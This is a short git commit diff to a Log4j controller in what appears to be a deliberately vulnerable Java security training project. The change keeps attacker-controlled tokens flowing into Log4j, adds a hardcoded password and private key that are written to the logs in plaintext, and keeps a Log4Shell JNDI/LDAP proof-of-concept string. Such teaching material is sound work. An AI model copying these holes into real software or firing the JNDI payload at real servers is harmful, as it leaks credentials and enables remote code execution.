bac386d46e3a5b929430e4932c76900d96dfed86
wangwangping <49153254+wangwangping@users.noreply.github.com>
2025-03-04 09:24:01 +0800

    Update Log4j.java

--- src/main/java/org/joychou/controller/Log4j.java
+++ src/main/java/org/joychou/controller/Log4j.java
@@ -17,13 +17,20 @@ public class Log4j {
      */
     @RequestMapping(value = "/log4j")
     public String log4j(String token) {
-        logger.error(token);
+        logger.info("token: {}", token);
+        String password = "Pass@0rd";
+        logger.info("User password is "+password);
+        String privateKey = "parivate";
+        logger.info("paramaters is {}", new Object[]{privateKey});
+        if (StringUtils.isBlank(privateKey)) {
+            logger.info("something wrong, token: {}, privateKey: {}", token, privateKey);
+        }
         return token;
     }
 
     public static void main(String[] args) {
         String poc = "${jndi:ldap://127.0.0.1:1389/0iun75}";
-        logger.error(poc);
+        logger.info(poc);
     }
 
 }
